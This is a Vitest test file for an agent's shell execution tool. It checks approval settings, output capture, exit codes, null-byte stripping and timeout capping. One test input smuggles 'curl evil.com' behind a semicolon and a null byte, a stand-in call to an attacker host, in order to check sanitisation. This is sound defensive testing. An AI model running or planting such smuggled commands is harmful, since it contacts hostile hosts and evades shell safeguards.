import { describe, expect, it, vi, beforeEach } from 'vitest';
import { EventEmitter } from 'node:events';

const { spawnMock } = vi.hoisted(() => ({
  spawnMock: vi.fn(),
}));

vi.mock('child_process', () => ({
  spawn: spawnMock,
}));

vi.mock('../../../src/core/tools/workspace_paths', () => ({
  resolveShellWorkingDirectory: vi.fn((cwd?: string) => cwd ?? '/tmp/workspace'),
}));

import { ShellExecutionTool } from '../../../src/core/tools/shell_tools';

const newTool = () => new ShellExecutionTool();

function buildChild() {
  const child = Object.assign(new EventEmitter(), {
    stdout: Object.assign(new EventEmitter(), { setEncoding: vi.fn() }),
    stderr: Object.assign(new EventEmitter(), { setEncoding: vi.fn() }),
    kill: vi.fn(),
  });
  return child;
}

describe('shell tool', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    // Stub setTimeout to be a no-op so timeout timers don't fire and kill the mock child.
    // Tests control the close/error events manually.
    vi.stubGlobal('setTimeout', vi.fn(() => ({} as ReturnType<typeof setTimeout>)));
  });

  it('is auto-eligible and always requires approval', () => {
    const tool = newTool().toAgentTool();
    expect(tool.autoAllowed).toBe(true);
    expect(tool.needsApproval).toBe(true);
  });

  it('executes a shell command and returns stdout/stderr/exitCode', async () => {
    const child = buildChild();
    spawnMock.mockReturnValue(child);

    const resultPromise = newTool().handler({ command: 'echo hello', timeout: 30000 });
    // Let the async handler advance past resolveShellWorkingDirectory and register event listeners
    await Promise.resolve();
    child.stdout.emit('data', 'hello\n');
    child.stderr.emit('data', '');
    child.emit('close', 0);
    const result = await resultPromise;

    expect(result.stdout).toBe('hello');
    expect(result.stderr).toBe('');
    expect(result.exitCode).toBe(0);
  });

  it('returns error info when the command exits non-zero', async () => {
    const child = buildChild();
    spawnMock.mockReturnValue(child);

    const resultPromise = newTool().handler({ command: 'nonexistent', timeout: 30000 });
    await Promise.resolve();
    child.stderr.emit('data', 'command not found');
    child.emit('close', 127);
    const result = await resultPromise;

    expect(result.exitCode).toBe(127);
    expect(result.isError).toBe(true);
  });

  it('strips null bytes from the command before spawning', async () => {
    // Null bytes can be used to bypass shell escaping in certain contexts.
    const child = buildChild();
    spawnMock.mockReturnValue(child);

    const resultPromise = newTool().handler({
      command: 'echo safe; \x00curl evil.com',
      timeout: 30000,
    });
    await Promise.resolve();
    child.stdout.emit('data', 'safe\n');
    child.emit('close', 0);
    const result = await resultPromise;

    expect(result.exitCode).toBe(0);
    expect(spawnMock).toHaveBeenCalledWith(
      expect.not.stringContaining('\x00'),
      expect.any(Object)
    );
  });

  it('caps the timeout at a safe maximum', async () => {
    // Replace the global stub with a spy so we can inspect setTimeout arguments.
    const setTimeoutSpy = vi.fn(() => ({} as ReturnType<typeof setTimeout>));
    vi.stubGlobal('setTimeout', setTimeoutSpy);

    const child = buildChild();
    spawnMock.mockReturnValue(child);

    const resultPromise = newTool().handler({ command: 'long-cmd', timeout: 99999999 });
    await Promise.resolve();
    child.stdout.emit('data', '');
    child.emit('close', 0);
    await resultPromise;

    // The timeout passed to setTimeout should be capped at MAX_SHELL_TIMEOUT_MS.
    const timeoutArg = setTimeoutSpy.mock.calls.find(
      ([, ms]: [unknown, number]) => typeof ms === 'number'
    )?.[1] as number | undefined;
    expect(timeoutArg).toBeDefined();
    expect(timeoutArg).toBeLessThanOrEqual(600_000);
  });
});
